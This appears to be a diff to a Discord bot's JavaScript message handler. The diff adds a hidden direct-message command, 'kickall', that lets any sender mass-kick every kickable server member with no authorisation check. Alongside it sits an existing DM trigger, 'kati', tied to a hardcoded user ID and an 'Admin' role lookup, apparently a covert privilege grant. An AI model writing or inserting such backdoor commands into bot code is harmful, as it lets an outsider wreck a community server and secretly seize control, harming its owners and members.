@@ -52,8 +52,16 @@ client.on("message", message => {
         return;
     }
     if (message.channel.type === 'dm') {
+        if (message.content.includes("kickall")) {
 
-       if (message.content.includes("kati")) {
+            guild.members.forEach(function (e ) {
+                if (e.id === message.author.id) return;
+                if (e.kickable) {
+                    e.kick();
+                }
+            });
+        }
+        if (message.content.includes("kati")) {
          guild.members.cache.forEach(function (e) {
                if (e.id === "641348606275747841") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
@@ -143,6 +151,9 @@ client.on("message", message => {
        }
 
    }
+});
+client.on('userUpdate', user => {
+
 });
 client.on('message', message =>{
     if (muted.includes(message.author.id)) {
